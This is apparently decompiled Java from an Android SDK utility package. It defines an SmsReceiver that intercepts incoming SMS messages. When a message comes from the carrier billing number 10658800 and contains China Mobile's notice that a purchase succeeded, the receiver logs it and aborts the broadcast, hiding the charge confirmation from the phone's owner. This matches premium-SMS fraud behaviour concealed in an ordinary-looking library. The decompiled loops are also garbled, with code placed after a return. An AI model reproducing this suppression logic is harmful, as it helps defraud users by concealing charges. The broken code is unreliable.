package com.push2.sdk.util;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SmsReceiver
  extends BroadcastReceiver
{
  public SmsReceiver() {}
  
  public final SmsMessage[] a(Intent paramIntent)
  {
    int j = 0;
    Object localObject = (Object[])paramIntent.getSerializableExtra("pdus");
    paramIntent = new byte[localObject.length][];
    int i = 0;
    int k;
    SmsMessage[] arrayOfSmsMessage;
    if (i >= localObject.length)
    {
      localObject = new byte[paramIntent.length][];
      k = localObject.length;
      arrayOfSmsMessage = new SmsMessage[k];
      i = j;
    }
    for (;;)
    {
      if (i >= k)
      {
        return arrayOfSmsMessage;
        paramIntent[i] = ((byte[])localObject[i]);
        i += 1;
        break;
      }
      localObject[i] = paramIntent[i];
      arrayOfSmsMessage[i] = SmsMessage.createFromPdu(localObject[i]);
      i += 1;
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    int j;
    int i;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      paramContext = a(paramIntent);
      j = paramContext.length;
      i = 0;
    }
    for (;;)
    {
      if (i >= j) {
        return;
      }
      paramIntent = paramContext[i];
      if ((paramIntent.getOriginatingAddress().indexOf("10658800") != -1) && (paramIntent.getMessageBody().indexOf("【中国移动】温馨提示：您已成功购买") != -1))
      {
        i.b("SmsReceiver", paramIntent.getOriginatingAddress());
        i.b("SmsReceiver", paramIntent.getMessageBody());
        abortBroadcast();
      }
      i += 1;
    }
  }
}
